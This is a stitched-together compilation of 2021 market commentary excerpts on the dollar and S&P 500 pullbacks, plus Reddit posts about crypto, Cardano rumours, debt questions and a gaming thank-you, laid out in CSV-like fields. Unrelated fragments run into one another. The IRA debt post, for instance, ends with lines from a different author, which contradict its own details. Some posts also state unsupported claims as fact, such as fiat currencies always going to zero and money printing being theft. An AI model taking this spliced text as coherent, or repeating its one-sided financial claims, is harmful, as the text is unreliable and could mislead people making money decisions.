&gt; It was a particularly challenging year for the greenback in 2020, where the world’s reserve currency acted as a “safe haven” asset at the height of the March 2020 market volatility, only to fall over the remainder of the year. With the U.S. outpacing much of the developed world in economic growth in 2021, Treasury yields have been rising and the dollar has strengthened, bucking the consensus view for dollar weakness.

&gt; We view the “twin deficits” of the U.S. economy—the combination of the budget deficit and the current account deficit—as a long-term structural driver of a weaker U.S. dollar. As a historical net importer, the U.S. has usually carried a trade deficit (leading to a broader current account deficit in the process), while the flood of pandemic aid has stretched the budget deficit and ballooned the sum of the twin deficits to all-time lows as a percent of gross domestic product (GDP). As shown in the LPL Chart of the Day, changes in the twin deficits have been a relatively accurate predictor in the long-term trend of the value of the US dollar:

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i2.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.22.21-Blog-Chart-1.png?ssl=1))**

&gt; With the twin deficits reaching all-time lows, it’s hard to be bullish the US dollar over the long-term relative to its major counterparts. “The short-dollar trade has certainly been a frustrating one for investors this year, but the long-term trend continues to point lower,” added LPL Financial Chief Market Strategist Ryan Detrick. “However, a counter-trend rally like we saw in the first quarter might have been enough to flush out some of the crowded consensus for a lower dollar.”

&gt; U.S. economic growth has outpaced our developed nation counterparts to begin 2021, but expectations for growth in the rest of the world may be playing catch up. In particular, the 30-year German bund yield broke out to its highest level since the onset of the pandemic, suggesting growth expectations for one of our major trade partners may be on the rise.

&gt; A soft dollar has a variety of investment implications. While we continue to favor U.S. stock market exposure over developed international markets, investments overseas may benefit from the tailwind of the softer dollar. Meanwhile, commodities have historically benefitted from a weaker dollar, and may be positioned for further upside as economic activity in the rest of the world heats up.

&gt; # Dips in Short Supply

&gt; While many areas of the market have seen sizable pullbacks this year, the broader market has been stingier. Just this morning, a client was lamenting the fact that they had a decent amount of cash, but the market just wasn't providing opportunities to get in. So far this year, the S&amp;P 500's largest decline from a peak (on a closing basis) has been 4.23%, and given that we're not even four full months into the year, we initially thought that 4% seemed normal enough especially when the earlier months of the year tend to be positive.

&gt; In order to see how this year stacks up to prior years, the chart below shows the duration into each year (on a percentage basis) that the S&amp;P 500 first closed down 5% or more from its YTD peak. Years in green indicate that there wasn't a single point in the entire year that the S&amp;P 500 experienced a 5% decline. The last occurrence was in 2017, and there have been a total of seven years since 1928. As we near the end of April, we're nearly a third of the way into 2021, and compared to the 'average' year, we've already gone longer without a 5% pullback. Since 1928, the S&amp;P 500 usually experiences its first 5%+ pullback 28% of the way into the year, which coincidentally enough works out to April 15th - the day before Federal taxes are typically due! In fact, at this point in prior years, the S&amp;P 500 has already experienced its first 5%+ pullback more than 65% of the time. Believe it or not, in 30% of all years since 1928 the first 5% drop occurred in the month of January.

&gt; Based on prior years, the market to this point has in fact been stingy in terms of providing opportunities for investors to add exposure, although based on today's reports of new capital gains tax increases from the Biden Administration, that window may soon open.

&gt; # What is a 200-Day Moving Average Again?

&gt; If we've learned anything over the last two trading days after what seemed like a one-way move higher for the S&amp;P 500, it is that equities can also go down. Even after the declines of the last couple of days, though, the S&amp;P 500 still remains close to 4% above its 50-day moving average (DMA) and more than 10% above its 200-DMA. While there have been a handful of days since the COVID lows where the S&amp;P 500 has dipped below its 50-DMA, there hasn't been a single day since last June where the S&amp;P 500 came even close to testing its 200-DMA. We're only in late April now, but as long as the S&amp;P 500 doesn't see a significant fall in the next two months, it has the potential to go a full year without closing below its 200-DMA. When the 200-DMA does finally come into play again, many investors may not recognize what it is.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/04/042021-SP-500.png))**

&gt; The chart below shows the percentage of time over a rolling one-year period that the S&amp;P 500 traded above its 200-DMA. At 89% now, the current level is hardly remarkable by historical standards. Right before the COVID crash last year, the percentage reached as high as 97.6%, and three years ago in March 2018, it was up at 100%. What is remarkable about the chart, though, is how elevated this moving average has been for so long. The last time it was below 50% was back in December 2009!

&gt; It's easy to tell by looking at the chart, but thanks to short and swift pullbacks in the post-financial crisis period, this current streak without a sub-50% reading is the longest on record. To put a little more meat on the example, after the current streak of nearly 11.5 years, the next longest streak stretched over a period of just under ten years spanning from April 1991 through March 2001 while the one behind that was less than five years (ending in May 2008). And you only thought the market had been defying gravity recently!

Can a person tell much by looking at price changes over a relatively short period of time? No.  

Is Bitcoin's price volatile? Yes.  

Does Bitcoin's price volatility matter to long-term, buy-and-hold investors/owners? No.  

Do many people know what Bitcoin actually is, and the basics of how it works? No.  

Do many people understand fiat money? Fractional reserve banking? Central banking? No.  

Is the current global financial system still based entirely upon fiat currencies? Yes.  

Is fiat money backed by anything? No, not since 1971.  

Is fiat money created from thin air by central bankers? Yes, by the trillions.  

Is excessive ""money printing"" a form of theft? Yes.  

Do fiat currencies always devalue to zero? Yes.  

What about today's fiat currencies? They are well on their ways to zero.  

Did criminal bankers get bailouts about ten years ago? Yes.  

Did criminal bankers go to jail for causing the 2008/9 crisis? No, they got paid huge bonuses from the bailout money.  

Did anything significant get fixed as a result of 2008/9. No. In fact, today's situation is even worse than then.  

Are banker bailouts still happening? Apparently: recent Fed repo activities... looks like some Too Big To Fail / Too Big To Jail entity is insolvent. Stay tuned.  

Is the economy doing well? For the top one-tenth of one percent, yes.  For the rest, the bottom 99.9% - with few exceptions, no

Is Bitcoin better than gold? In many ways, yes. Overall, for sure.  

Should people panic and sell their Bitcoin holdings because of a sudden change in price? That's not for me to decide. Still, I learned a long time ago not to panic.  

Has Bitcoin seen sudden and significant price changes in the past? Yes, both up and down.

CryptoCurrency,What’s so bad about Doge?,"Expecting to get downvoted by sweats but here goes.

What is the problem with doge? It’s the ultimate gateway crypto and brings more people into crypto. It’s fun, actually useable and has a great community. If you want greater crypto adoption this can only be a good thing.

Most people I know who started out with doge are now invested into many other projects, doing their own research and engaging with DeFi. How is this not positive?

I’m fed up of hearing ‘oh but people will lose al their money buying at the top’. This is the same of any cryptocurrency and any asset class. And you do not care about these people so stop pretending you do. 

I’m not a bot and I’m not trolling I just genuinely want to know what the problem with Doge is? And why it’s price rise is ‘bad’ in the eyes of r/CryptoCurrency community?

gaming,Whoever was playing Journey this morning... THANK YOU!,"You absolutely made my six-year-old daughter’s day!!

My daughter is six, and loves to play video games. Usually we play together, but I just had a new baby, and my time for video gaming is nonexistent. Today, she asked about the game Journey for the PS3 after hearing a song from its soundtrack play on my phone. I told her she was old enough to play it, and got her started on it while I fed the baby. I thought there was NO way anyone else would join our game, given how old the title is, and I told her we probably wouldn’t run into anyone else while she played...

But there WAS someone who showed up in level two, and she was thrilled!! Whoever it was stayed right by her little side, helping her along and showing her which way to go. She was over the moon!

She rarely complains about the fact that I’m all consumed with her new sister, but I know she feels frustrated at times. She isn’t in public school due to Covid, so we both can go a little crazy stuck together in the house all day.

So thank you, whoever you are. You absolutely made her day, and mine. Thanks for being her helper, and friend.

UPDATE:
After the game ended, the name of the other player came on the screen, so I messaged them to thank them. Turns out his ten-year-old son was the one playing with my daughter, and he was equally thrilled!",technology

personalfinance,Should i cash out SOME of my IRA to pay high interest debt?,"Hey  guys/girls,

&amp;#x200B;

I got married last year and had unforeseen moving costs, and long story short my wife and I have about 16k of high interest credit card debt (22-24%). I've never had credit card debt in my life. My credit score has gone from 765-688 and my wife's was never high but it is 630s. 

&amp;#x200B;

I have a 401k with my current employer - about 10k (I switched last year and starting July I am eligible for a 6% match dollar for dollar) and about 50k in my IRA (Traditional). My wife has a 401k of about 10k as well. 

&amp;#x200B;

In January, I switched my contribution to 1% for my 401k and i liquidated my stocks to pay for 20k of debt and now we sit around 15k.

&amp;#x200B;

I would need to take out 22k from my IRA to fully pay off the debt after taxes + penalty. Having debt is EXTREMELY stressful to me. I have low interest student loan payments (22 months left) but my wife has high interest and I do want to refinance her debt, which will potentially save us a lot of money. 

&amp;#x200B;

The other variable is that my wife and I want to get our credit AS GREAT as possible as we plan to buy a house in the next 2 years as well as get good interest rates on a car that we need to get for our child coming soon.

&amp;#x200B;

We both make good money (about 170k total + potentially more coming as i go from promo in Sept and she is searching for a job.) but we have a baby on the way with more medical expenses coming. Once we have freed up funds - we can donate better to our retirement. We have high earning potential in the coming years. 

&amp;#x200B;

We are in debt due to a kind of ""fluke"" scenario with all the one time moving, wedding, ring and other expenses of the past year. The other thing that makes it a fluke is that my wife's company (it starts with O and is a lead software provider with hundreds of thousands of employees) has changed their commission structure and basically all of my wife's organization hasn't received a dime of their commission (which for her is 80k).

&amp;#x200B;

I'm very nifty in the market and have made HUGE returns last year, but i cant put any more in as i liquidated my earnings to pay debt and now i can invest with my IRA. 

&amp;#x200B;

I'm thinking if we can free up debt, i still have 28k in my IRA plus will effectively get 12% in my 401k plus more income in month on my own to invest and trade - plus the freeing up of stress.

Right now I'm studying for my CPA and only work as a part time doordasher making $1200+ a month. The only debt I have right now is my car since I live with my parents.

personalfinance,Pay down car note or student loans in forbearance?,"The wife and I facing a dilemma.  We currently have an auto loan of ~30k and an interest rate of 3%.  We also have a few student loans totaling ~50k with a interest rates of between 5-6%.  However, they are all federal loans, meaning they are currently in forbearance , requiring no monthly payment and accruing no interest.  Forbearance is set to expire in September.  We have an extra $1k in our monthly budget to pay down debt.  Which is more financially advantageous to pay down first?

On the one hand, the auto note is accruing interest now, so the avalanche method would point me to pay that off first while the student loans are in forbearance.  On the other, the student loans will start accruing more interest in October, which means I should start paying them off then.  But will I save more by paying it down sooner rather than later?  Every dollar paid off now avoids greater interest in the future. I'm leaning to paying the student loans first, but I can't find a debt calculator that models this situation.",finance

personalfinance,Credit Union accidentally gives me 0% APR on personal loan and insists I come in to sign a new contract,"Back at the end of 2020 I decided to purchase a new car for myself. I went to finance a newer car through a larger credit union in my state but pulled the loan as a personal loan rather than an auto loan (because of the vehicle mileage I was offered a better APR through the personal).

Long story short because of my age and credit history my APR was *intended* to be about 12% on the $7,800 loan, but when my loan officer typed up the contract he accidentally put down 0% on the official contract that all parties e-signed on DocuSign. About two weeks later they noticed their mistake and are now insisting on having me come back in to resign a new contract and void out the old one (since they definitely don't want me paying 0%ARP on a loan that they consolidated with an older loan I had with them). So could I be put in financial or legal danger by refusing to sign the new contract and sticking with the original 0% one?

In their system they have it set as %12 and I have been paying monthly based on that interest rate since I pulled the loan back in November (monthly interest being nearly as much per month as the principle). So if I keep making minimum payments per month I'll end up paying that 12%APR which contradicts the contract they had us sign. Since it was pulled as a personal loan rather than an auto loan I hold the title to the vehicle and they required no collateral on the loan so it isn't like they could easily take the car away from me if I refuse to sign the new contract. They have now been calling me sometimes twice a week asking me to go in a sign the new contract but have yet to make any form of threat on what might happen if I don't sign it.

So how should I go about this? Obviously I don't want to pay that interest if I don't have to since THEY were the ones that messed up the contract and gave me 0%ARP. If I keep paying monthly based on the APR in their system I will have overpaid by almost $1k after the five year term is up. Will they have to pay me back all that money?

I really appreciate any advice I could get on this. My credit history is pretty limited so I don't have a whole lot of experience with credit and loans and all that. Thanks!

dogecoin,The 21 million limit vs. Dogecoin (Questions),"I keep seeing financial institutions and/or professionals stating that one of the drawbacks of Dogecoin is the fact that there is no upper limit to how many coins can be ""minted"" within the Dogecoin fork. They seem to be saying that Bitcoin's 21 million limit makes the coin instrinsictly more valuable than other cryptos.

But my question is, isn't that type of limit precisely the reason that the FIAT money world abandoned the gold standard in the first place? Doesn't Dogecoin (and other cryptos like it) fit in better with the current economic models? 
As I understand it, the Fed is now free to print money as they see fit (because they are no longer bound by the intrinsic value of how much gold they actually hold). I can see how such a move introduces instability into economic systems, but wouldn't the Bitcoin limit introduce instability as well (by having a pre determined amount that can essentially only be trated by a small pool of users; basically stagnating it's movement within a given economy?).

I have about 16k remaining in my 529 college fund and no student loans. My state (PA) allows you to use 10k to pay off any qualified student loans (federal or private). I want to know if I can take out a student loan for ONLY living expenses (rent, food, bills), then pay that off using my 529. I would probably take out an 8 or 9k loan, one without penalties for paying it off early. I was approved with Discover for 8k but haven't signed off on anything.

Bitcoin,real inflation rates,"In 2010, there was a pretty famous study about 75k being the inflection point for a diminishing return on reported levels of happiness.

This year, a much deeper data study debunked that. The inflation adjusted income of 80k did not correlate with the ""sweet spot"" of happiness.

I'm writing an article for an REIT, so I took a look at homeownership as a control. in 2010, the average cost of a home was 279k. At 75k income, that's about 3.7x your annual income.

In 2021 at 80k (""inflation adjusted""), the average cost of a new home is 409k....5.1x your annual salary. that means someone making 80k in 2021 is about **35% poorer** than someone making 75k just 10 years ago.

I'm posting this to point out what. crock of shit inflation rates are. They are fucking out of control. The 80k was determined off of federally reported inflation rates between 2010-2021. In just ten years time, if someone got the ""inflation raise"" consistently, they would be **8 years** further behind on a mortgage (and that's assuming you have 20% to put down NOW) just *10 years* later.

Bitcoin,Wild Ride - looking back at the past few years,"I started buying crypto in 2017 and watched the price screen on Coinbase when bitcoin hit 20,000. I had been buying it from 10-16k. Then, it began to fall and I started selling. I also had coins in a Binance account. Eventually, I got out with a small loss. Two years ago BC dropped into the 3-4k range and I was happy to be out. Literally all of the financial gurus said BC was useless and might go to 0. 

Well, BC was back to 10k 6 months ago - and since then it's been skyrocketing. I have no idea where the price will go in the future, but traders are now thinking that it might replace the US Dollar or Gold as an alternative form of global currency. Just looking at the price chart over the past year it seems that the BC price began to rise dramatically after the November elections. This might reflect uncertainty about US fiscal and monetary policy going forward, or might just be a coincidence. With BC you never know what's really driving the price. But, the long term trend is certainly up, but the pullbacks are just massive. Same with the other ""coins"". 

I have to remind myself that the term ""coin"" doesn't mean that there are actual hard assets involved - just computer code, and nobody really knows what anyone will use these ""coins"" for in the future. But, people are still buying them and trading them. Even if they were just imaginary numbers, a case could be made for trading them. If the prices go up and down, then it's possible to trade them and make some money - or lose money. In the long run, I think most of the guru's have changed their tune from BC is useless and going to zero, to maybe it's the future of global currency and will be worth who knows how much. At least there can only be 21 million BCs, right? So, owning BC isn't like owning paper currency that can be devalued by printing more.

Fiat currencies typically have low levels of inflation to, among other things, encourage investment and consumption and to discourage hoarding. So far, most cryptocurrencies have behaved more like deflationary currencies because their extremely limited supply relative to the population of cryptocurrency users drives up their prices.

Yes, it's really unfortunate that the cash is only worth 46k now when it would have been worth $400k+ at the time of its burial.

I am writing this post to try to explain the purpose of inflationary currencies as compared to deflationary currencies, and why they would serve fundamentally different purposes. Please note that I am not an economist, and this is not a field in which I work.

Below is information excerpted from the Wikipedia article on the indicated topics. Italics, bolding, and ellipses are my own for emphasis and clarity. I did by best not to cherry-pick, but instead to focus this discussion on the issues:

# [Fiat Currencies](https://en.wikipedia.org/wiki/Fiat_money) 

Paraphrased: Fiat currencies typically do not have intrinsic or use value. They have value only because a government maintains its value, or because parties engaging in exchange agree on its value. The US Dollar, and basically every national currency, are examples of a fiat currency. With respect to inflation:

&gt;The adoption of fiat currency by many countries, from the 18th century onwards, made much larger variations in the supply of money possible. Since then, huge increases in the supply of paper money have occurred in a number of countries, producing hyperinflations – episodes of extreme inflation rates much greater than those observed during earlier periods of commodity money. The hyperinflation in the Weimar Republic of Germany is a notable example.  
&gt;  
&gt;Economists generally believe that high rates of inflation and hyperinflation are caused by an excessive growth of the money supply... However, money supply growth does not always cause nominal increases of price. Money supply growth may instead result in stable prices at a time in which they would otherwise be decreasing.

# [Inflation](https://en.wikipedia.org/wiki/Inflation)

Contrary to the conventional wisdom of this subreddit, inflation has positive and negative effects on economies. This sub has done well pointing out some negative effects of inflation, and I wanted to balance that out by showing the upsides that are typically not included in those discussions.

&gt;Inflation affects economies in various positive and negative ways. The **negative effects** of inflation include an **increase in the opportunity cost of holding money,** uncertainty over future inflation which may discourage investment and savings, and if inflation were rapid enough, shortages of goods as consumers begin hoarding out of concern that prices will increase in the future. **Positive effects** include reducing unemployment due to nominal wage rigidity, allowing the central bank greater freedom in carrying out monetary policy, **encouraging loans and investment instead of money hoarding, and avoiding the inefficiencies associated with deflation.**  
&gt;  
&gt;Today, most economists favour a low and steady rate of inflation. Low (as opposed to zero or negative) inflation reduces the severity of economic recessions by enabling the labor market to adjust more quickly in a downturn, and reduces the risk that a liquidity trap prevents monetary policy from stabilising the economy. The task of keeping the rate of inflation low and stable is usually given to monetary authorities. Generally, these monetary authorities are the central banks that control monetary policy through the setting of interest rates, through open market operations, and through the setting of banking reserve requirements.

# [Deflation](https://en.wikipedia.org/wiki/Deflation)

For added context, here are some key concepts of deflation (the opposite of inflation):

&gt;In economics, deflation is a decrease in the general price level of goods and services.\[1\] Deflation occurs when the inflation rate falls below 0% (a negative inflation rate). Inflation reduces the value of currency over time, but sudden deflation increases it.  
&gt;  
&gt;...**Deflation is also related to risk aversion, where investors and buyers will start hoarding money because its value is now increasing over time.** This can produce a liquidity trap \[*people prefer holding cash rather than non-liquid forms of money*\] or it may lead to shortages that entice investments yielding more jobs and commodity production...  
&gt;  
&gt;**Deflation is the natural condition of economies when the supply of money is fixed, or does not grow as quickly as population and the economy. When this happens, the available amount of hard currency per person falls, in effect making money more scarce, and consequently, the purchasing power of each unit of currency increases.** Deflation also occurs when improvements in production efficiency lower the overall price of goods. Competition in the marketplace often prompts those producers to apply at least some portion of these cost savings into reducing the asking price for their goods. When this happens, consumers pay less for those goods, and consequently, deflation has occurred, since purchasing power has increased.

# Conclusions

* Fiat currencies serve specific purposes. They tend to be inflationary to disincentive hoarding and to incentivize investment and consumption. Therefore, **stating that because the USD is inflationary should not be interpreted as a conclusion that the government is intentionally trying to make you poor over 75 years.** The government is trying to incentivize us to USE our USD so that it has value by serving its purpose: **facilitating the exchange of goods and services.**
* The most significant barrier to the adoption of cryptocurrencies like Bitcoin, (just an example, please ignore fees and outdated technology), is that the supply of the currency is deflationary (supply has a hard limit, coins leave the market as people buy them, lose wallet keys, hard drives, or for whatever other reason no longer have their coins). **Why would you ever want to be the next Bitcoin pizza guy?**
* We have been witnessing the problem with constrained cryptocurrency supply for years now - **most people would rather hoard cryptocurrencies than spend them on anything because it provides more value to you as an asset for investment than as a medium of exchange.** Further, the entire mantra of this subreddit is to 'hodl' until one can cash out in their home nation's fiat currencies. That is literally just another way of saying that we want to hoard cryptocurrency for as long as it is likely to increase in value. I know I will get replies like ""but I just bought a Tesla with BTC"" or whatever. That's great, and good on you for helping crypto achieve its goals! The problem is that there are not enough of us doing that to stabilize the prices of cryptocurrency. Who knows if and when that will happen.
* Bitcoin, Reddit Moons, and many other cryptocurrencies have a fixed supply of currency. Correct me if I am wrong, but **it is impossible** to create new Bitcoins. Therefore, as long as the population of Bitcoin users increases, Bitcoin is guaranteed to be deflationary. 
* We are also seeing deflationary indications from Etherium because its supply is growing slowly relative to the increase in its use, which fits the definition of scarce money described in the deflation article. There is no reason to think that ANY OTHER cryptocurrency with usage increases greater than than its supply will experience anything other than deflationary patterns like the others in the short and medium term.

personalfinance,How would you allocate $16K?,"Hello, I (26 this year)  have been living abroad for several years and will move back to the USA  in the fall to attend graduate school (2 years part time school/full time job). When I come back I will have $8k in savings and $8k from severance/pension from my current job (a total of about  $16k). The only debt I currently have is $2500 in federal student loans which is on deferment. I'm hoping that the president will do something about it but if not I can easily pay it off monthly. I will be moving back in with family and will not have to pay rent but I will be paying expenses such as health insurance, car insurance, phone bill and general expenses. I will need to get a car, I don't live in area with good public transportation, and a new laptop as mine is on its last leg. I also need to start saving for retirement. I have come up with a few ideas for how to allocate the money.

\#1 - 7k car, 4k retirement savings, 3k savings (2kpersonal, 1k investments), 1k laptop/desk for school (its mostly online) and 1k living expenses (until I can find a job)

\#2 6k car, 4k retirement savings, 4k savings (3kpersonal, 1k investments), 1k laptop/desk for school and 1k living expenses

\#3 5k car, 5k retirement savings, 4k savings (3kpersonal, 1k investments), 1k laptop/desk for school and 1k living expenses

Which way do you think is best or how would you allocate the money? 

Thanks",finance
CryptoCurrency,XRP (Ripple),"XRP, you seem to be... ready to show the feds a clear victory

You need to seek, some retribution

For this attack -  this intrusion

This poor excuse of a case, that still left Ripple's coin in ruins

Dropped below $0.15, counted out by many

Then it popped its head up saying ""Hey we're ready""

To take there rightful place in crypto top 5

Far from the ATH, but it rides

Forward... be forewarned...

You can count XRP out and cast doubt

Those who HODL won't mind, when it's time to cash out

cardano,Cardano Rumor Rundown APR 25 2021,"Hey Everyone!

Let's go....

Newly covered today: 

1. IOHK’s Development Update for this week includes news that end-to-end tests of the ERC-20 Converter are commencing along with a mention of some oracle work under the Goguen update section. [https://roadmap.cardano.org/en/status-updates/update/2021-04-23/](https://roadmap.cardano.org/en/status-updates/update/2021-04-23/)
2. The number of defi projects that have announced plans to be on Cardano just keeps climbing with [Yayswap.io](https://yayswap.io/) joining the list of Liqwid, Occam,  and CardSwap/CardStarter.
3. Kraken publishes a “What is Cardano?” article.   Says “...Cardano may not promise new ground-breaking features..” Oh yeah?  What about native tokens that don’t require smart contracts?  What about the EUTXO model allowing predictable and accurate local calculation of transaction fees in your wallet before you execute? What about a consensus algorithm that’s so good, another top 10 coin made their system derivative of it? That’s all standard these days? [https://twitter.com/krakenfx/status/1386038990864793607](https://twitter.com/krakenfx/status/1386038990864793607)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
4. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
5. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
6. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
7. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

17. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience.

18. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)

24. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
27. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
41. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

